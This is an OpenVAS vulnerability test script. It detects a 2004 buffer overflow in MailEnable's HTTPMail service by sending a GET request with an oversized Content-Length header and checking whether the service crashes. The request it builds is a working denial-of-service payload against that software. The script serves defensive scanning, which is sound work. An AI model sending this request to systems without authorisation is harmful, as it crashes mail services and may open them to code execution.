# OpenVAS Vulnerability Test
# $Id: mailenable_httpmail_content_length_overflow.nasl 9348 2018-04-06 07:01:19Z cfischer $
# Description: MailEnable HTTPMail Service Content-Length Overflow Vulnerability
#
# Authors:
# George A. Theall, <theall@tifaware.com>
#
# Copyright:
# Copyright (C) 2004 George A. Theall
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.14655");
  script_version("2019-04-11T14:06:24+0000");
  script_tag(name:"last_modification", value:"2019-04-11 14:06:24 +0000 (Thu, 11 Apr 2019)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_bugtraq_id(10838);
  script_name("MailEnable HTTPMail Service Content-Length Overflow Vulnerability");
  script_category(ACT_DENIAL);
  script_copyright("This script is Copyright (C) 2004 George A. Theall");
  script_family("Denial of Service");
  script_dependencies("gb_get_http_banner.nasl");
  script_mandatory_keys("MailEnable/banner");
  script_require_ports("Services/www", 8080);

  script_tag(name:"solution", value:"Upgrade to MailEnable Professional / Enterprise 1.2 or later or apply
  the HTTPMail hotfix from 9th August 2004.");

  script_tag(name:"summary", value:"The target is running at least one instance of MailEnable that has a
  flaw in the HTTPMail service (MEHTTPS.exe) in the Professional and Enterprise Editions.");

  script_tag(name:"insight", value:"The flaw can be exploited by issuing an HTTP GET
  with an Content-Length header exceeding 100 bytes, which causes a fixed-length buffer to overflow,
  crashing the HTTPMail service and possibly allowing for arbitrary code execution.");

  script_xref(name:"URL", value:"http://archives.neohapsis.com/archives/fulldisclosure/2004-07/1314.html");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");

port = get_http_port(default:8080);

banner = get_http_banner(port:port);
if(!banner || ! egrep(pattern:"^Server: .*MailEnable", string:banner))
  exit(0);

if(http_is_dead(port:port))
  exit(0);

req = string("GET / HTTP/1.0\r\n",
             "Host: ", get_host_ip(), "\r\n",
             "Content-Length: ", crap(length:100, data:"9"), "XXXX\r\n",
             "\r\n");
res = http_send_recv(port:port, data:req);
if(!res && http_is_dead(port:port)) {
  security_message(port:port);
  exit(0);
}

exit(99);